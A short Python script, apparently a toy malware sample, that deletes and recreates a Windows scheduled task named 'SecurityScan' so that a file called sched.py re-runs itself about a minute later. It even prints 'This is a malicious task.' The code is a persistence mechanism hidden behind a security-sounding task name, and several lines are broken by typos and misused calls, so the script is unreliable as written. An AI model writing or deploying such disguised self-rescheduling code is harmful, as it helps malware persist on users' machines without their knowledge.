from dataclasses import field
import os, random
from datetime import datetime, timedelta

if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtask /delete /f /tn securityScan")

print("This is a malicious task.")

fieldir =os.path.join(os.getcwd(), "sched.py")

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))
dt = datetime.now() + timedelta(minutes=interval)
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill9(2))
d = "%s:%s" % (str(dt.month, str(dt.day)).zfill(2),dt.year)
os.system('schtasks /create /tn SecurityScan /tr "'+fieldir+'" /sc once /st '+t+' /sd' +d)
input()